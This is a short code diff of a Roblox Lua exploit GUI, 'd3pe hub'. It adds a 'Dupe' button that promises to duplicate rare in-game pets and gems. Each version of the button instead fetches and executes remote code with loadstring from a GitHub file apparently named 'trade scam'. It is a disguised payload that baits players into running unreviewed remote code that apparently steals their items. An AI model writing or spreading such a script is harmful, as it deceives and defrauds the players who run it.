@@ -4,13 +4,6 @@ local Window = Library.CreateLib("d3pe hub", "Ocean")
     local Main = Window:NewTab("Main")
     local MainSection = Main:NewSection("Main")
 
-
-    MainSection:NewToggle("dupe", "go fast and dupe huges", function(state)
-        if state then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/leotovalid/TradeScamPSX/main/trade%20scam"))()
-
-        else
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/leotovalid/TradeScamPSX/main/trade%20scam"))()
-
-        end
+    MainSection:NewButton("Dupe", "Makes you dupe all huge and gems", function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/leotovalid/TradeScamPSX/main/trade%20scam'))()
     end)
